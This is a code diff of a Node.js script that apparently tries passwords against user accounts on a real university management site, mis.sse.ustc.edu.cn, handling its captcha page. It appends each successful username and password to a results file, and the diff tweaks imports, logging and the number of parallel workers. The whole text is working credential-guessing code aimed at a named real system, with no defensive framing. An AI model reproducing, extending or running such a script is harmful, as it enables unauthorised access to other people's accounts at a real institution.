@@ -38,8 +38,8 @@ exports.__esModule = true;
 var FormData = require("form-data");
 var node_fetch_1 = require("node-fetch");
 var cheerio = require("cheerio");
-var fs_1 = require("fs");
-var os_1 = require("os");
+var fs = require("fs");
+var os = require("os");
 var log = console.log;
 var baseUrl = "http://mis.sse.ustc.edu.cn/";
 var pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g;
@@ -55,6 +55,7 @@ function worker(username) {
                 return __generator(this, function (_a) {
                     switch (_a.label) {
                         case 0:
+                            log("username: ", username);
                             mypass = password;
                             _a.label = 1;
                         case 1:
@@ -120,7 +121,7 @@ function worker(username) {
                             }
                             else {
                                 log("success ", "用户名: ", username, "密码: ", mypass);
-                                fs_1["default"].appendFile("result.txt", "success " + "用户名: " + username + "密码: " + os_1["default"].EOL, function (err) {
+                                fs.appendFile("result.txt", "success " + "用户名: " + username + "密码: " + os.EOL, function (err) {
                                     console.log(err);
                                 });
                                 success = true;
@@ -155,7 +156,7 @@ function worker(username) {
                 }
             }
         }
-        for (var i = 0; i < 50; i++) {
+        for (var i = 0; i < 2; i++) {
             increase();
             app();
         }
